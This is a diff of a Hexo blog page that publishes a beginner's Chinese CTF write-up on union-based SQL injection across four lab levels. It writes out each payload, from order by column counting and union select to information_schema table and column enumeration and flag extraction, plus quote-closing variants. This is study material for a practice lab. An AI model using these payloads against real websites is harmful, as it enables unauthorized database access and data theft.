@@ -6,15 +6,38 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2023/7 | Hexo</title>
+  <title>初学CTF第二周——SQL显错注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2023/07/index.html">
+  <meta name="description" content="任务 通过显错注入获得flag。 对该页面进行GET传参，传参名为id">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初学CTF第二周——SQL显错注入">
+<meta property="og:url" content="http://example.com/2023/07/22/%E5%88%9D%E5%AD%A6CTF%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E2%80%94SQL%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="任务 通过显错注入获得flag。 对该页面进行GET传参，传参名为id">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/image-20230722172031433.png">
+<meta property="og:image" content="http://example.com/img/image-20230722172353304.png">
+<meta property="og:image" content="http://example.com/img/image-20230722172457768.png">
+<meta property="og:image" content="http://example.com/img/image-20230722172936670.png">
+<meta property="og:image" content="http://example.com/img/image-20230723101514459.png">
+<meta property="og:image" content="http://example.com/img/image-20230723101742632.png">
+<meta property="og:image" content="http://example.com/img/image-20230723102903031.png">
+<meta property="og:image" content="http://example.com/img/image-20230723105252812.png">
+<meta property="og:image" content="http://example.com/img/image-20230723105400313.png">
+<meta property="og:image" content="http://example.com/img/image-20230723105828128.png">
+<meta property="og:image" content="http://example.com/img/image-20230723105955540.png">
+<meta property="og:image" content="http://example.com/img/image-20230723110437621.png">
+<meta property="og:image" content="http://example.com/img/image-20230723110725584.png">
+<meta property="og:image" content="http://example.com/img/image-20230723111128701.png">
+<meta property="og:image" content="http://example.com/img/image-20230723111327926.png">
+<meta property="og:image" content="http://example.com/img/image-20230723111359930.png">
+<meta property="og:image" content="http://example.com/img/image-20230723111535257.png">
+<meta property="article:published_time" content="2023-07-22T09:17:46.000Z">
+<meta property="article:modified_time" content="2023-07-23T03:29:32.643Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/image-20230722172031433.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,36 +173,140 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-初学CTF第二周——SQL显错注入" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/07/22/%E5%88%9D%E5%AD%A6CTF%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E2%80%94SQL%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2023-07-22T09:17:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-22</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/07/22/%E5%88%9D%E5%AD%A6CTF%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E2%80%94SQL%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/">初学CTF第二周——SQL显错注入</a>
+    <h1 class="article-title" itemprop="name">
+      初学CTF第二周——SQL显错注入
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2023/07/22/%E5%88%9D%E5%AD%A6CTF%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E2%80%94SQL%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2023-07-22T09:17:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><ol>
+<li>通过显错注入获得flag。</li>
+<li>对该页面进行GET传参，传参名为id</li>
+</ol>
+<span id="more"></span>
+
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>初始界面：</p>
+<p><img src="/../img/image-20230722172031433.png" alt="image-20230722172031433"></p>
+<p><strong>一、判断是否存在sql注入</strong></p>
+<p>赋值id&#x3D;1 and 1&#x3D;1，结果为：</p>
+<p><img src="/../img/image-20230722172353304.png" alt="image-20230722172353304"></p>
+<p>赋值id&#x3D;1 and 1&#x3D;2，结果为：</p>
+<p><img src="/../img/image-20230722172457768.png" alt="image-20230722172457768"></p>
+<p>说明将输入当作代码执行了，存在SQL注入。</p>
+<p><strong>二、通过order by来判断字段数</strong></p>
+<p>原理：order by 列数 是根据某一列进行排序，这样就可以一个一个数字去试，试到结果异常就说明不存在该列进而得知表中有几列（即几个字段）</p>
+<p>赋值id&#x3D;1 order by 1(正常)</p>
+<p>赋值id&#x3D;1 order by 2(正常)</p>
+<p>赋值id&#x3D;1 order by 3(正常)</p>
+<p>赋值id&#x3D;1 order by 4(异常)</p>
+<p><img src="/../img/image-20230722172936670.png" alt="image-20230722172936670"></p>
+<p>得知该表中的字段数为3，为什么要知道字段数呢？因为下面要使用union，union必须前后的查询字段要相同才能将结果联合在一起显示出来</p>
+<p><strong>三、找显错位</strong></p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,3（由于上面查询到字段为3个，所以这里用1，2，3判断显错位是哪个字段，and 1&#x3D;2的作用是让前半部分不返回结果，只返回union后面的结果）</p>
+<p><img src="/../img/image-20230723101514459.png" alt="image-20230723101514459"></p>
+<p>由结果得知显错位为2，3个字段</p>
+<p><strong>四、查找当前数据库</strong></p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,database()</p>
+<p><img src="/../img/image-20230723101742632.png" alt="image-20230723101742632"></p>
+<p>可知当前数据库为error</p>
+<p><strong>五、查找该数据库中有哪些表</strong></p>
+<p>原理：新版mysql都会有一个内置数据库叫information_schema，里面记载了所有数据库，表，字段</p>
+<p>通过查询该数据库从而得到error里面有什么表，以及字段等</p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’error’</p>
+<p>注意：由于第四点中查询database()中显示当前数据库是error，如果上述代码中的information_schema.tables写成了tables，则是在error数据库中的tables查询，这样是查不到的，因此必须要加个前缀information_schema，是在information_schema数据库中的tables查</p>
+<p>翻译一下，就是information_schema数据库中的tables表中记录了所有的数据库名和对应的表名，其中table_schema字段记录了数据库名，table_name字段记录了相应的表名。group_concat()是把查询到的所有表名都拼接在一起显示出来，有个缺点是如果显错位这里字符数有限制的话就可能显示得不完全造成误导，因此更推荐使用limit的以下代码（但我个人觉得有点麻烦）</p>
+<p>id&#x3D;1 and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’error’ limit 0,1</p>
+<p>id&#x3D;1 and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’error’ limit 1,1</p>
+<p>也可以用上述代码，修改limit后的下标位让表名一个个显示出来</p>
+<p>我就直接赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’error’</p>
+<p><img src="/../img/image-20230723102903031.png" alt="image-20230723102903031"></p>
+<p>这里可以得到两个表，也就是说error数据库里面是包含两个表，一个是error_flag，另一个是user，如果是正常渗透，应该两个表的字段都查一下，但id字段是user里面的，error_flag这个flag都提示那么明显了，显然flag就在error_flag这个表里面，因此下面只查询error_flag表中的字段</p>
+<p><strong>六、查询表中有哪些字段</strong></p>
+<p>原理同样是新版mysql中有个内置数据库information_schema记录了数据，在里面查询，但这次要查询的是表columns，column是列的意思，在数据库中，每一列都有一个字段，因此要查字段就在information_schema数据库中的columns表查，上面第五点要查表就在information_schema数据库中的tables表查。</p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema &#x3D;’error’ and table_name&#x3D;’error_flag’</p>
+<p><img src="/../img/image-20230723105252812.png" alt="image-20230723105252812"></p>
+<p>查到了flag就在error_flag表中，同样，上述的group_concat()可以使用limit来代替</p>
+<p>也可以查下user表中有什么字段</p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema &#x3D;’error’ and table_name&#x3D;user’</p>
+<p><img src="/../img/image-20230723105400313.png" alt="image-20230723105400313"></p>
+<p><strong>七、拿到flag</strong></p>
+<p>理一下：error数据库中有error_flag表，表中有字段id和flag</p>
+<p>赋值id&#x3D;1 and 1&#x3D;2 union select 1,2,group_concat(flag) from error_flag</p>
+<p><img src="/../img/image-20230723105828128.png" alt="image-20230723105828128"></p>
+<p>有四个flag，应该是每个id对应一个flag，正好有四关，每关一个flag，把id也打印出来看看</p>
+<p>id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(id),group_concat(flag) from error_flag</p>
+<p><img src="/../img/image-20230723105955540.png" alt="image-20230723105955540"></p>
+<p>确实是这样，这里是第一关，那么flag应该是zKaQ-Nf</p>
+<p>ps:id和flag字段，如果要用group_concat()必须同时使用，或者同时不使用，不然会报错1140。之前id的那个位置是数字2，所以只有flag使用group_concat()也没问题</p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p><img src="/../img/image-20230723110437621.png" alt="image-20230723110437621"></p>
+<p>比之前多了个’</p>
+<p>赋值id&#x3D;1’ and 1&#x3D;1 – qwe</p>
+<p><img src="/../img/image-20230723110725584.png" alt="image-20230723110725584"></p>
+<p>主要是让引号闭合，后面的引号注释掉就行了，其他和第一关相同</p>
+<p>ps：”– “是mysql中的注释，注意后面有个空格，后面加了qwe是为了防止–后面的空格被浏览器省略掉</p>
+<p>也可以用–+，+在url中也表示空格</p>
+<p>所以赋值赋值id&#x3D;1’ and 1&#x3D;1 –+也是可以的</p>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img src="/../img/image-20230723111128701.png" alt="image-20230723111128701"></p>
+<p>这关多了单引号和括号，原理一样，让前面的(‘闭合，让后面的’)被注释掉就行</p>
+<p>赋值id&#x3D;1’) and 1&#x3D;1 –+</p>
+<p>代入到数据库中执行的语句如下</p>
+<p><img src="/../img/image-20230723111327926.png" alt="image-20230723111327926"></p>
+<p>其他同第一关</p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p><img src="/../img/image-20230723111359930.png" alt="image-20230723111359930"></p>
+<p>原理同一样，和第三关的差别就是单引号变双引号了，注意别用两个单引号来代替双引号，键盘上是有双引号的键位的</p>
+<p>赋值id&#x3D;1”) and 1&#x3D;1 –+</p>
+<p>代入到数据库中执行的语句如下</p>
+<p><img src="/../img/image-20230723111535257.png" alt="image-20230723111535257"></p>
+<p>其他同第一关</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>显错注入的流程是：先判断是否有sql注入→order by找字段数→找显错位→找当前数据库→通过information_schema.tables找表→通过information_schema.columns找字段→然后可以直接根据字段在表中查值</p>
+<p>学习过程中犯的一些错：</p>
+<p>1.不小心用了中文的引号，查了半天都不知道哪里写错了代码，结果是符号问题。</p>
+<p>2.select 1,group_concat(id),group_concat(flag) from error_flag 这里的id和flag必须同时使用group_concat()或者同时不使用，否则会报错。</p>
+<p>3.select 1,id  from error_flag,flag  该代码纠结了好久都不知道是哪里错了，后面反应过来正确写法应该是</p>
+<p>select 1,id ,flag  from error_flag   应该把 from error_flag放在最后。</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -191,57 +318,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/07/22/%E5%88%9D%E5%AD%A6CTF%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E2%80%94SQL%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/07/15/%E5%88%9D%E5%AD%A6CTF%EF%BC%88%E7%AC%AC%E4%B8%80%E5%91%A8%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2023-07-15T08:31:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-15</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2023/07/15/%E5%88%9D%E5%AD%A6CTF%EF%BC%88%E7%AC%AC%E4%B8%80%E5%91%A8%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">初学CTF（第一周）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/07/15/%E5%88%9D%E5%AD%A6CTF%EF%BC%88%E7%AC%AC%E4%B8%80%E5%91%A8%EF%BC%89/">初学CTF（第一周）</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -264,8 +440,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
